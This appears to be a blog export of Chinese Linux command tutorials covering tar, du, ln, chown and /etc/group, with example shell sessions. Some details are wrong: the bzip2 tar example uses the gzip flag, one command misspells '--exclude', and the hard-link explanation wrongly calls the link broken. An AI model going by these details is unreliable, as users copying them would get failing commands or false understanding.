*.tar*-rw-r--r-- 1 root root 307200 11-29 17:54 log.tar-rw-r--r-- 1 root root 1413 11-29 17:55 log.tar.bz2-rw-r--r-- 1 root root 1413 11-29 17:54 log.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 tar -cvf log.tar log2012.log 仅打包，不压缩！ tar -zcvf log.tar.gz log2012.log 打包后，以 gzip 压缩 tar -zcvf log.tar.bz2 log2012.log 打包后，以 bzip2 压缩 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在参数 f 之后的文件档名是自己去的，习惯上都用 .tar 来作为辨识。如果加 z 参数，则以 .tar.gz 或 .tgz 来代表 gzip 压缩过的 tar 包；如果加 j 参数，则以 .tar.bz2 来作为 tar 报名。 实例2：查阅上述 tar 包内有哪些文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tar -ztvf log.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost test]# tar -ztvf log.tar.gz---xrw-r-- root/root 302108 2012-11-13 06:03:25 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于使用 gzip 压缩的 log.tar.gz，所以要查阅 log.tar.gz 包内的文件时，就要加上 z 这个参数 实例3：将 tar 包解压缩&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tar -zxvf /opt/soft/test/log.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost test3]# ll总计 0[root@localhost test3]# tar -zxvf /opt/soft/test/log.tar.gzlog2012.log[root@localhost test3]# lslog2012.log[root@localhost test3]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在预设的情况下，可以将压缩当在任何地方解压 实例4：只将 /tar 内的部分文件解压出来&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tar -zxvf /opt/soft/test/log30.tar.gz log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@localhost test]# tar -zcvf log30.tar.gz log2012.log log2013.log log2012.loglog2013.log[root@localhost test]# ls -al log30.tar.gz -rw-r--r-- 1 root root 1512 11-30 08:19 log30.tar.gz[root@localhost test]# tar -zxvf log30.tar.gz log2013.loglog2013.log[root@localhost test]# ll-rw-r--r-- 1 root root 1512 11-30 08:19 log30.tar.gz[root@localhost test]# cd test3[root@localhost test3]# tar -zxvf /opt/soft/test/log30.tar.gz log2013.loglog2013.log[root@localhost test3]# ll总计 4-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log[root@localhost test3]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以投过 tar -ztvf 来查阅 tar 包内的文件名称，如果单只要一个文件，就可透过这个方式来解压部分文件！ 实例5：文件备份下来，并且保存其权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tar -zcvpf log31.tar.gz log2014.log log2015.log lo2016.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021[root@localhost test]# ll总计 0-rw-r--r-- 1 root root 0 11-13 06:03 log2014.log-rw-r--r-- 1 root root 0 11-13 06:06 log2015.log-rw-r--r-- 1 root root 0 11-16 14:41 log2016.log[root@localhost test]# tar -zcvpf log31.tar.gz log2014.log log2015.log log2016.log log2014.loglog2015.loglog2016.log[root@localhost test]# cd test6[root@localhost test6]# ll[root@localhost test6]# tar -zxvpf /opt/soft/test/log31.tar.gz log2014.loglog2015.loglog2016.log[root@localhost test6]# ll总计 0-rw-r--r-- 1 root root 0 11-13 06:03 log2014.log-rw-r--r-- 1 root root 0 11-13 06:06 log2015.log-rw-r--r-- 1 root root 0 11-16 14:41 log2016.log[root@localhost test6]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个 -p 的属性是很重要的，尤其是要保留原文本文件的属性时 实例6：在文件夹当中，比某个日期新的文件才备份&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tar -N "2012/11/13" -zcvf log17.tar.gz test &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314[root@localhost soft]# tar -N "2012/11/13" -zcvf log17.tar.gz testtar: Treating date `2012/11/13' as 2012-11-13 00:00:00 + 0 nanosecondstest/test/log31.tar.gztest/log2014.logtest/linklog.logtest/log2015.logtest/log2013.logtest/log2012.logtest/log2017.logtest/log2016.logtest/log30.tar.gztest/log.tartest/log.tar.bz2test/log.tar.gz 实例7：备份文件夹内容是排除部分文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tar --exclide scf/service -zcvf scf.tar/gz scf/* &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@localhost test]# tree scfscf|-- bin|-- doc|-- lib`-- service `-- deploy |-- info `-- product7 directories, 0 files[root@localhost test]# tar --exclude scf/service -zcvf scf.tar.gz scf/* scf/bin/scf/doc/scf/lib/[root@localhost test]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- du]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F36.%20Linux%20%E5%91%BD%E4%BB%A4-%20du%2F</url>
    <content type="text"><![CDATA[Linux 命令- du&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux du 命令也是查看是有那个空间的，但是与 df 命令不同的是对文件和目录磁盘使用的空间的查看，还是和 df 命令有一写区别的。 1.命令格式1du [选项] [文件] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示每个文件和目录的磁盘使用空间。 3.命令参数 -a或-all 显示目录中个别文件的大小。 -b或-bytes 显示目录或文件大小时，以byte为单位。 -c或–total 除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。 -k或–kilobytes 以KB(1024bytes)为单位输出。 -m或–megabytes 以MB为单位输出。 -s或–summarize 仅显示总计，只列出最后加总的值。 -h或–human-readable 以K，M，G为单位，提高信息的可读性。 -x或–one-file-xystem 以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。 -L&lt;符号链接&gt;或–dereference&lt;符号链接&gt; 显示选项中所指定符号链接的源文件大小。 -S或–separate-dirs 显示个别目录的大小时，并不含其子目录的大小。 -X&lt;文件&gt;或–exclude-from=&lt;文件&gt; 在&lt;文件&gt;指定目录或文件。 –exclude=&lt;目录或文件&gt; 略过指定的目录或文件。 -D或–dereference-args 显示指定符号链接的源文件大小。 -H或–si 与-h参数相同，但是K，M，G是以1000为换算单位。 -l或–count-links 重复计算硬件链接的文件。 4.使用实例实例1：显示目录或者文件所占空间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314[root@localhost test]# du608 ./test6308 ./test44 ./scf/lib4 ./scf/service/deploy/product4 ./scf/service/deploy/info12 ./scf/service/deploy16 ./scf/service4 ./scf/doc4 ./scf/bin32 ./scf8 ./test31288 .[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只显示当前目录下面的子目录的目录大小和当前目录的总的大小，最下面的 1288 为当前目录的总大小。 实例2：显示指定文件所占空间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123[root@localhost test]# du log2012.log 300 log2012.log[root@localhost test]# 实例3：查看指定目录的所占空间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du scf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost test]# du scf4 scf/lib4 scf/service/deploy/product4 scf/service/deploy/info12 scf/service/deploy16 scf/service4 scf/doc4 scf/bin32 scf[root@localhost test]# 实例4：显示多个文件所占空间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du log30.tar.gz log31.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test]# du log30.tar.gz log31.tar.gz 4 log30.tar.gz4 log31.tar.gz[root@localhost test]# 实例5：只显示总和的大小&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du -s &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost test]# du -s1288 .[root@localhost test]# du -s scf32 scf[root@localhost test]# cd ..[root@localhost soft]# du -s test1288 test[root@localhost soft]# 实例6：方便阅读的格式显示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du -h test &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314[root@localhost soft]# du -h test608K test/test6308K test/test44.0K test/scf/lib4.0K test/scf/service/deploy/product4.0K test/scf/service/deploy/info12K test/scf/service/deploy16K test/scf/service4.0K test/scf/doc4.0K test/scf/bin32K test/scf8.0K test/test31.3M test[root@localhost soft]# 实例7：文件和目录都显示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du -ah test &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526272829303132333435363738[root@localhost soft]# du -ah test4.0K test/log31.tar.gz4.0K test/test13.tar.gz0 test/linklog.log0 test/test6/log2014.log300K test/test6/linklog.log0 test/test6/log2015.log4.0K test/test6/log2013.log300K test/test6/log2012.log0 test/test6/log2017.log0 test/test6/log2016.log608K test/test60 test/log2015.log0 test/test4/log2014.log4.0K test/test4/log2013.log300K test/test4/log2012.log308K test/test44.0K test/scf/lib4.0K test/scf/service/deploy/product4.0K test/scf/service/deploy/info12K test/scf/service/deploy16K test/scf/service4.0K test/scf/doc4.0K test/scf/bin32K test/scf4.0K test/log2013.log300K test/log2012.log0 test/log2017.log0 test/log2016.log4.0K test/log30.tar.gz4.0K test/log.tar.bz24.0K test/log.tar.gz0 test/test3/log2014.log4.0K test/test3/log2013.log8.0K test/test34.0K test/scf.tar.gz1.3M test[root@localhost soft]# 实例8：显示几个文件或目录各自占用磁盘空间的大小，还统计它们的综合&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du -c log30.tar.gz log31.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# du -c log30.tar.gz log31.tar.gz 4 log30.tar.gz4 log31.tar.gz8 总计[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加上 -c 选项后，du 不仅先死两个目录各自占用磁盘空间的大小，还在最后一行统计它们的总和。 实例9：按照空间大小排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du|sort -nr|more &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314[root@localhost test]# du|sort -nr|more1288 .608 ./test6308 ./test432 ./scf16 ./scf/service12 ./scf/service/deploy8 ./test34 ./scf/service/deploy/product4 ./scf/service/deploy/info4 ./scf/lib4 ./scf/doc4 ./scf/bin[root@localhost test]# 实例10：输出当前目录下各个子目录所使用的空间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1du -h --max-depth=1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost test]# du -h --max-depth=1608K ./test6308K ./test432K ./scf8.0K ./test31.3M .[root@localhost test]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- ln]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F37.%20Linux%20%E5%91%BD%E4%BB%A4-%20ln%2F</url>
    <content type="text"><![CDATA[Linux 命令- ln&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ln 是 Linux 中又一个非常重要的命令，它的功能的功能是为某一个文件在另一个位置建立一个同步的连接。当需要在不同的目录，用到相同的文件时，就不需要在每个需要的目录下都放一个必须相同的文件，只要在某个固定的目录，放上该文件，然后在其他的目录下用 ln 命令连接（link）就可以，不必重复的占用磁盘空间。 1.命令格式1ln [参数] [源文件或目录] [目标文件或目录] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 文件系统中，有所谓的连接（link），可以将其视为档案的别名。而连接有可分为两种：硬链接（hard link）与软连接（symbolic link），硬连接的意思是一个档案可以有多个名称，而软连接的方式则是产生一个特殊的档案，该档案的内容是指向另一个档案的位置。硬链接是存在同一个文件系统中，而软连接却可以跨越不同的文件系统。 软连接 软连接，一路径的形式存在。类似与 windows 系统中的快捷方式； 软连接可以跨文件系统，硬链接不可以； 软连接可以对一个不存在的文件名进行连接； 4.软连接可以对目录进行连接 硬链接 硬链接，以文件副本的形式存在。但不占用实际空间； 不允许给目录创建硬链接； 硬链接只有在同一个文件系统中才能创建。 注意 ln 命令会保持每一处连接文件的同步性，也就是说，不论改动了哪一处，其他的文件都会发生相同的变化； ln 的连接又分软连接和硬链接两种，软连接就是 ln -s [源文件] [目标文件] ，它只会在选定的位置上生成一个文件的镜像，不回占用磁盘空间，硬链接 ln [源文件] [目标文件] ，没有参数 -s ，会在选定的文职上生成一个和源文件大小相同的文件，无论是软连接还是硬链接，文件都保持同步变化。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ln 指令在连接文件或目录，如同时指定两个以上的文件或目录，且最后的目的地是一个存在的目录，则会把前面指定的所有文件或目录复制到该目录中。若同时指定多个文件或目录，且最后的目的地并非是有一个已存在的目录，则会出现错误信息。 3.命令参数必要参数 -b 删除，覆盖以前建立的链接 -d 允许超级用户制作目录的硬链接 -f 强制执行 -i 交互模式，文件存在则提示用户是否覆盖 -n 把符号链接视为一般目录 -s 软链接(符号链接) -v 显示详细的处理过程 选择参数 -S “-S&lt;字尾备份字符串&gt; ”或 “–suffix=&lt;字尾备份字符串&gt;” -V “-V&lt;备份方式&gt;”或“–version-control=&lt;备份方式&gt;” –help 显示帮助信息 –version 显示版本信息 使用实例实例1：给文件创建软连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ln -s log2013.log link2013 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost test]# ll-rw-r--r-- 1 root bin 61 11-13 06:03 log2013.log[root@localhost test]# ln -s log2013.log link2013[root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 1 root bin 61 11-13 06:03 log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为 log2013.log 文件创建软连接 link2013 ，如果 log2013.log 丢失，link2013 将失效。 实例2：给文件创建硬连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ln log2013.log ln2013 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 1 root bin 61 11-13 06:03 log2013.log[root@localhost test]# ln log2013.log ln2013[root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 2 root bin 61 11-13 06:03 ln2013-rw-r--r-- 2 root bin 61 11-13 06:03 log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为 log2013.log 创建硬链接 ln2013 ，log2013.log 与ln2013 的各项属性相同。 实例3：接上面两实例，连接完毕后，删除和重建连接源文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 2 root bin 61 11-13 06:03 ln2013-rw-r--r-- 2 root bin 61 11-13 06:03 log2013.log[root@localhost test]# rm -rf log2013.log [root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 1 root bin 61 11-13 06:03 ln2013[root@localhost test]# touch log2013.log[root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 1 root bin 61 11-13 06:03 ln2013---xrw-r-- 1 root bin 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 0 12-07 16:19 log2013.log[root@localhost test]# vi log2013.log 2013-012013-022013-032013-042013-052013-062013-072013-082013-092013-102013-112013-12[root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 1 root bin 61 11-13 06:03 ln2013-rw-r--r-- 1 root root 96 12-07 16:21 log2013.log[root@localhost test]# cat link2013 2013-012013-022013-032013-042013-052013-062013-072013-082013-092013-102013-112013-12[root@localhost test]# cat ln2013 hostnamebaidu=baidu.comhostnamesina=sina.comhostnames=true &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1.源文件被删除后，并没有影响硬链接文件；软连接文件在 conetos 系统下不断的闪烁，提示远未见已经不存在 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.重建源文件后，团连接不再闪烁提示，说明已经连接成功，找到了连接文件系统；重建后，硬链接文件并没有收到源文件影响，硬链接文件的内容还是保留了删除前源文件的内容，说明硬链接已经失效。 实例4：将文件链接为另一个目录中的相同名字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ln log2013.log test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526[root@localhost test]# ln log2013.log test3[root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 1 root bin 61 11-13 06:03 ln2013-rw-r--r-- 2 root root 96 12-07 16:21 log2013.log[root@localhost test]# cd test3[root@localhost test3]# ll-rw-r--r-- 2 root root 96 12-07 16:21 log2013.log[root@localhost test3]# vi log2013.log 2013-012013-022013-032013-042013-052013-062013-072013-082013-092013-10[root@localhost test3]# ll-rw-r--r-- 2 root root 80 12-07 16:36 log2013.log[root@localhost test3]# cd ..[root@localhost test]# lllrwxrwxrwx 1 root root 11 12-07 16:01 link2013 -&gt; log2013.log-rw-r--r-- 1 root bin 61 11-13 06:03 ln2013-rw-r--r-- 2 root root 80 12-07 16:36 log2013.log[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 test3 目录中创建了 log2013.log 的硬链接，修改 test3 目录中的 log2013.log 文件，同时也会同步到源文件 实例5：给目录创建软连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ln -sv /opt/soft/test/test3 /opt/soft/test/test5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627282930[root@localhost test]# lldrwxr-xr-x 2 root root 4096 12-07 16:36 test3drwxr-xr-x 2 root root 4096 12-07 16:57 test5[root@localhost test]# cd test5[root@localhost test5]# lllrwxrwxrwx 1 root root 5 12-07 16:57 test3 -&gt; test3[root@localhost test5]# cd test3-bash: cd: test3: 符号连接的层数过多[root@localhost test5]# [root@localhost test5]# [root@localhost test5]# lllrwxrwxrwx 1 root root 5 12-07 16:57 test3 -&gt; test3[root@localhost test5]# rm -rf test3[root@localhost test5]# ll[root@localhost test5]# ln -sv /opt/soft/test/test3 /opt/soft/test/test5创建指向“/opt/soft/test/test3”的符号链接“/opt/soft/test/test5/test3”[root@localhost test5]# lllrwxrwxrwx 1 root root 20 12-07 16:59 test3 -&gt; /opt/soft/test/test3[root@localhost test5]# [root@localhost test5]# cd test3[root@localhost test3]# ll总计 4-rw-r--r-- 2 root root 80 12-07 16:36 log2013.log[root@localhost test3]# touch log2014.log[root@localhost test3]# ll总计 4-rw-r--r-- 2 root root 80 12-07 16:36 log2013.log-rw-r--r-- 1 root root 0 12-07 17:05 log2014.log[root@localhost test3]# cd ..[root@localhost test5]# cd .. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 目录只能创建软连接 目录创建链接必须用绝对路径，相对路径创建会不成功，会提示：符号连接的层数过多 ，这样的错误 在连接目标目录中修改文件都会在源文件目录中同步变化]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- chown]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F30.%20Linux%20%E5%91%BD%E4%BB%A4-%20chown%2F</url>
    <content type="text"><![CDATA[Linux 命令- chown&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;chown将指定文件的拥有者改为指定的用户或组，用户可以是用户名或者用户ID；组可以是组名或者组ID；文件是以空格分开的要改变权限的文件列表，支持通配符。系统管理员经常使用chown命令，在将文件拷贝到另一个用户的名录下之后，让用户拥有使用该文件的权限。 1.命令格式1chown [选项] [所有者]:[组] [文件] 2.命令功能必要参数 -c 显示更改的部分的信息 -f 忽略错误信息 -h 修复符号链接 -R 处理指定目录以及其子目录下的所有文件 -v 显示详细的处理信息 -deference 作用于符号链接的指向，而不是链接文件本身 选择参数 –reference=&lt;目录或文件&gt; 把指定的目录/文件作为参考，把操作的文件/目录设置成参考文件/目录相同拥有者和群组 –from=&lt;当前用户：当前群组&gt; 只有当前用户和群组跟指定的用户和群组相同时才进行改变 –help 显示帮助信息 –version 显示版本信息 4.使用实例实例1.改变拥有者和群组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chown mail:mail log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718[root@localhost test6]# ll---xr--r-- 1 root users 302108 11-30 08:39 linklog.log---xr--r-- 1 root users 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root users 0 11-30 08:39 log2014.log-rw-r--r-- 1 root users 0 11-30 08:39 log2015.log-rw-r--r-- 1 root users 0 11-30 08:39 log2016.log-rw-r--r-- 1 root users 0 11-30 08:39 log2017.log[root@localhost test6]# chown mail:mail log2012.log [root@localhost test6]# ll---xr--r-- 1 root users 302108 11-30 08:39 linklog.log---xr--r-- 1 mail mail 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root users 0 11-30 08:39 log2014.log-rw-r--r-- 1 root users 0 11-30 08:39 log2015.log-rw-r--r-- 1 root users 0 11-30 08:39 log2016.log-rw-r--r-- 1 root users 0 11-30 08:39 log2017.log[root@localhost test6]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将文件 log2012.log 的属主 root 和 属组 users 改变为 属主 mail 和属组 mail 实例2.改变文件拥有者和群组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chown root: log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost test6]# ll总计 604---xr--r-- 1 root users 302108 11-30 08:39 linklog.log---xr--r-- 1 mail mail 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root users 0 11-30 08:39 log2014.log-rw-r--r-- 1 root users 0 11-30 08:39 log2015.log-rw-r--r-- 1 root users 0 11-30 08:39 log2016.log-rw-r--r-- 1 root users 0 11-30 08:39 log2017.log[root@localhost test6]# chown root: log2012.log [root@localhost test6]# ll总计 604---xr--r-- 1 root users 302108 11-30 08:39 linklog.log---xr--r-- 1 root root 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root users 0 11-30 08:39 log2014.log-rw-r--r-- 1 root users 0 11-30 08:39 log2015.log-rw-r--r-- 1 root users 0 11-30 08:39 log2016.log-rw-r--r-- 1 root users 0 11-30 08:39 log2017.log[root@localhost test6]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将文件 log2012.log 的属主和属组改变为 root 实例3.改变文件群组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chown :mail log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819root@localhost test6]# ll总计 604---xr--r-- 1 root users 302108 11-30 08:39 linklog.log---xr--r-- 1 root root 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root users 0 11-30 08:39 log2014.log-rw-r--r-- 1 root users 0 11-30 08:39 log2015.log-rw-r--r-- 1 root users 0 11-30 08:39 log2016.log-rw-r--r-- 1 root users 0 11-30 08:39 log2017.log[root@localhost test6]# chown :mail log2012.log [root@localhost test6]# ll总计 604---xr--r-- 1 root users 302108 11-30 08:39 linklog.log---xr--r-- 1 root mail 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root users 0 11-30 08:39 log2014.log-rw-r--r-- 1 root users 0 11-30 08:39 log2015.log-rw-r--r-- 1 root users 0 11-30 08:39 log2016.log-rw-r--r-- 1 root users 0 11-30 08:39 log2017.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只把文件 log2012.log 的属组改变为 mail 属主不变 实例4.改变指定目录以及其字目录下的所有文件的拥有者和群组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chown -R -v root:mail test6 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223[root@localhost test]# lldrwxr-xr-x 2 root users 4096 11-30 08:39 test6[root@localhost test]# chown -R -v root:mail test6“test6/log2014.log” 的所有者已更改为 root:mail“test6/linklog.log” 的所有者已更改为 root:mail“test6/log2015.log” 的所有者已更改为 root:mail“test6/log2013.log” 的所有者已更改为 root:mail“test6/log2012.log” 的所有者已保留为 root:mail“test6/log2017.log” 的所有者已更改为 root:mail“test6/log2016.log” 的所有者已更改为 root:mail“test6” 的所有者已更改为 root:mail[root@localhost test]# lldrwxr-xr-x 2 root mail 4096 11-30 08:39 test6[root@localhost test]# cd test6[root@localhost test6]# ll总计 604---xr--r-- 1 root mail 302108 11-30 08:39 linklog.log---xr--r-- 1 root mail 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root mail 61 11-30 08:39 log2013.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2014.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2015.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2016.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2017.log]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[/etc/group 文件详解]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F31.%20group%20%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[/etc/group 文件详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux /etc/group文件与/etc/passwd和/etc/shadow文件都是有关于系统管理员对用户和用户组管理时相关的文件。linux /etc/group文件是有关于系统管理员对用户和用户组管理的文件,linux用户组的所有信息都存放在/etc/group文件中。具有某种共同特征的用户集合起来就是用户组（Group）。用户组（Group）配置文件主要有 /etc/group和/etc/gshadow，其中/etc/gshadow是/etc/group的加密信息文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将用户分组是Linux系统中对用户进行管理及控制访问权限的一种手段。每个用户都属于某个用户组；一个组中可以有多个用户，一个用户也可以属于不 同的组。当一个用户同时是多个组中的成员时，在/etc/passwd文件中记录的是用户所属的主组，也就是登录时所属的默认组，而其他组称为附加组。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户组的所有信息都存放在/etc/group文件中。此文件的格式是由冒号(:)隔开若干个字段，这些字段具体如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;组名:口令:组标识号:组内用户列表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;具体解释： 组名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;组名是用户组的名称，有字母或数字构成。与 /etc/passwd 中的登录名一样，组名不应重复 口令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;口令字段存放在用户组加密后的口令字。一般 Linux 系统的用户组都没有口令，即这个字段一般为空，或者是 * 。 组标识号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;组标识号与用户标识号类似，也是一个证书，被系统内部用来标识组。别称 GID 。 组内用户列表&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是属于这个组的所有用户的列表，不同用户之间用逗号（，）分隔。这个用户组可能是用户的主组，也可能是附加组。 使用实例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test6]# cat /etc/grouproot:x:0:root,linuxsirbin:x:1:root,bin,daemondaemon:x:2:root,bin,daemonsys:x:3:root,bin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 